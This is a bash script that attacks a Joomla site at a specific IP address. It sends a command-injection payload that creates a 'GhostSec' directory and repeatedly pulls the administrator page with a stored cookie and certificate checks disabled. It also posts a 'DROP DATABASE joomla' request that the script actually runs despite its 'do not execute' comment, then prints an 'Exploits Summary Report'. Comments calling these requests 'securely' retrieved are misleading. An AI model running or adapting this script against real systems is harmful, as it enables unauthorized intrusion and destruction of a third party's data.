
#!/bin/bash

# Command injection to create a directory
curl http://128.199.156.5/index.php --data "option=com_content&view=category&layout=blog&id=75&Itemid=167&cmd=echo \$(mkdir GhostSec) > /tmp/GhostSec.txt"

# Retrieve the current user (potential reconnaissance)
user_recon_output=$(curl --cookie cookie.txt --insecure http://128.199.156.5/administrator/index.php)

# Retrieve the current user using wget
wget --cookie cookie.txt --no-check-certificate http://128.199.156.5/administrator/index.php -O wget_user_output.txt

# Securely retrieve the current user with curl
curl --cookie cookie.txt -k http://128.199.156.5/administrator/index.php -o curl_user_output.txt

# Securely retrieve the current user with wget and no proxy
wget --cookie cookie.txt --no-check-certificate --no-proxy http://128.199.156.5/administrator/index.php -O wget_no_proxy_user_output.txt

# Securely retrieve the current user with curl and no proxy
curl --cookie cookie.txt -k --no-proxy http://128.199.156.5/administrator/index.php -o curl_no_proxy_user_output.txt

# Securely retrieve the current user with wget, no certificate check, and proxy off
wget --cookie cookie.txt --no-check-certificate --proxy off http://128.199.156.5/administrator/index.php -O wget_proxy_off_user_output.txt

# Dangerous command to drop Joomla database (do not execute)
curl_output=$(curl --data "query=DROP DATABASE joomla;" http://128.199.156.5/index.php 2>&1)

# Summary Report
echo -e "\n---- Exploits Summary Report ----\n"
echo "1. Command Injection to Create Directory:"
cat /tmp/GhostSec.txt

echo -e "\n2. Reconnaissance - Current User:"
echo "$user_recon_output"

echo -e "\n3. Wget - Current User:"
cat wget_user_output.txt

echo -e "\n4. Curl - Current User:"
cat curl_user_output.txt

echo -e "\n5. Wget - Current User (No Proxy):"
cat wget_no_proxy_user_output.txt

echo -e "\n6. Curl - Current User (No Proxy):"
cat curl_no_proxy_user_output.txt

echo -e "\n7. Wget - Current User (Proxy Off):"
cat wget_proxy_off_user_output.txt

echo -e "\n8. Dangerous Command Output (Do not execute):"
echo "$curl_output"

